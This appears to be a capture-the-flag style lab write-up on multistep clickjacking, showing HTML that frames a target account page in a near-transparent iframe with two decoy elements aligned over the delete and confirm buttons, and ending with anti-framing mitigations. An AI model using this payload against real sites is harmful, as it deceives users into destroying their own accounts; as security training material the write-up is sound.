# Lab: Multistep Clickjacking

## Description

This lab demonstrates a multistep clickjacking attack against an account deletion feature protected by both a CSRF token and a confirmation dialog. The objective is to trick the victim into performing two separate clicks, one to initiate the account deletion and another to confirm the action.

## Exploitation

First, I logged into the application using the provided credentials and observed that deleting an account required two user interactions: clicking the **Delete Account** button followed by confirming the action in a dialog box. To exploit this functionality, I created a malicious page containing two visible decoy elements.

The target account page was embedded inside a transparent iframe. The first decoy element was aligned with the **Delete Account** button, while the second decoy element was positioned over the confirmation button. After adjusting the iframe dimensions and reducing its opacity, the exploit was delivered to the victim.

When the victim clicked **"Click me first"**, the hidden **Delete Account** button was activated. Subsequently, clicking **"Click me next"** triggered the confirmation dialog button, resulting in successful account deletion.

### Exploit HTML

```html id="j9bifv"
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    .firstClick,
    .secondClick {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }

    .secondClick {
        top: 340px;
        left: 120px;
    }
</style>

<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```



This lab demonstrates that confirmation dialogs alone are insufficient to prevent clickjacking attacks. By carefully aligning multiple decoy elements with the corresponding buttons inside a transparent iframe, an attacker can deceive users into performing a sequence of actions. Effective mitigation requires anti-framing protections such as **X-Frame-Options** and **Content Security Policy (CSP)**.
